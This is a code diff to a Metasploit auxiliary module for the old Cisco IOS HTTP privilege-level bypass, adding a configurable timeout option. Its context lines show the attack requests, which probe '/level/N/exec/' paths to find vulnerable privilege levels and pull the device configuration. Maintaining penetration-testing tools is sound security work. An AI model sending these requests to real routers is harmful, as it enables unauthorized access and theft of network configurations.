@@ -39,6 +39,15 @@ class Metasploit3 < Msf::Auxiliary
           [ 'OSVDB', '578' ],
         ],
       'DisclosureDate' => 'Jun 27 2001'))
+
+    register_options(
+      [
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 20 ])
+      ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 20
   end
 
   def run_host(ip)
@@ -47,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
       res = send_request_cgi({
         'uri'  		=>  "/level/#{level}/exec/show/version/CR",
         'method'   	=> 'GET'
-      }, 20)
+      }, timeout)
 
       if res and res.body and res.body =~ /Cisco Internetwork Operating System Software/
         print_good("#{rhost}:#{rport} Found vulnerable privilege level: #{level}")
@@ -68,7 +77,7 @@ class Metasploit3 < Msf::Auxiliary
         res = send_request_cgi({
           'uri'  		=>  "/level/#{level}/exec/show/config/CR",
           'method'   	=> 'GET'
-        }, 20)
+        }, timeout)
 
         if res and res.body and res.body =~ /<FORM METHOD([^\>]+)\>(.*)<\/FORM>/mi
           config = $2.strip
